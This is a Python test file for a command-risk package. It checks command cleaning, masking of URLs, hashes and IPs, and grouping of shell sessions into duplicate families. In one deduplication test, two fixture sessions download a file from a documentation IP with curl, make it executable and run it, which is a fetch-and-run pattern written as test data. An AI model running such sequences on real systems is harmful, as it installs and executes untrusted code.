from __future__ import annotations

from cmdrisk.data.dedup import (
    assign_families,
    cap_families,
    exact_deduplicate,
    session_jaccard,
)
from cmdrisk.data.normalization import clean_command, normalize_record, skeletonize_command
from cmdrisk.schema import CommandEvent, Label, SessionRecord, SourceInfo, SourceKind


def _session(
    session_id: str,
    commands: list[str],
    *,
    family_id: str = "pending",
    kind: SourceKind = SourceKind.SCRIPT_BENIGN,
) -> SessionRecord:
    return SessionRecord(
        session_id=session_id,
        source=SourceInfo(kind=kind, name="test", license="CC0-1.0"),
        family_id=family_id,
        commands=[CommandEvent(cmd=command) for command in commands],
        label=Label(malicious=0, quality="high"),
    )


def test_clean_command_removes_ansi_and_prompt() -> None:
    raw = "\x1b[32mroot@host:/tmp#\x1b[0m  whoami\r\n"
    assert clean_command(raw) == "whoami"


def test_skeleton_masks_high_cardinality_values() -> None:
    value = (
        "curl https://example.invalid/a -o /tmp/a && "
        "echo 550e8400-e29b-41d4-a716-446655440000 "
        "deadbeefdeadbeef dGhpcy1pc2EtbG9uZy1iYXNlNjQtdG9rZW4= 192.0.2.4"
    )
    skeleton = skeletonize_command(value)

    assert "<URL>" in skeleton
    assert "<PATH>" in skeleton
    assert "<UUID>" in skeleton
    assert "<HEX>" in skeleton
    assert "<B64>" in skeleton
    assert "<IP>" in skeleton


def test_skeleton_keeps_hex_and_base64_token_precedence() -> None:
    assert skeletonize_command("echo deadbeefdeadbeefdeadbeefdeadbeef") == "echo <HEX>"
    assert skeletonize_command("echo dGhpcy1pc2EtbG9uZy1iYXNlNjQtdG9rZW4=") == "echo <B64>"


def test_normalize_record_preserves_raw_commands() -> None:
    record = normalize_record(
        _session("raw", ["\x1b[31muser@host$ echo hi\x1b[0m", "ls /tmp/a"])
    )

    assert [event.cmd for event in record.commands] == ["echo hi", "ls /tmp/a"]
    assert record.meta["raw_commands"] == ["\x1b[31muser@host$ echo hi\x1b[0m", "ls /tmp/a"]
    assert record.meta["skeletons"] == ["echo hi", "ls <PATH>"]


def test_exact_and_near_duplicate_families_are_deterministic() -> None:
    values = [
        _session("a", ["curl http://198.51.100.1/a -o /tmp/a", "chmod +x /tmp/a", "/tmp/a"]),
        _session("b", ["curl http://203.0.113.2/b -o /var/tmp/b", "chmod +x /var/tmp/b", "/var/tmp/b"]),
        _session("c", ["pwd", "ls", "id"]),
    ]
    exact = exact_deduplicate(values)
    families = assign_families(exact, threshold=0.9)

    assert len(exact) == 3
    assert families[0].family_id == families[1].family_id
    assert families[0].family_id != families[2].family_id
    assert session_jaccard(families[0], families[1]) == 1.0


def test_family_cap_is_seeded_and_keeps_at_least_one() -> None:
    values = [_session(f"s-{index}", ["id"], family_id="same") for index in range(100)]
    first = cap_families(values, max_fraction=0.1, minimum=1, seed=42)
    second = cap_families(values, max_fraction=0.1, minimum=1, seed=42)

    assert len(first) == 10
    assert [record.session_id for record in first] == [record.session_id for record in second]
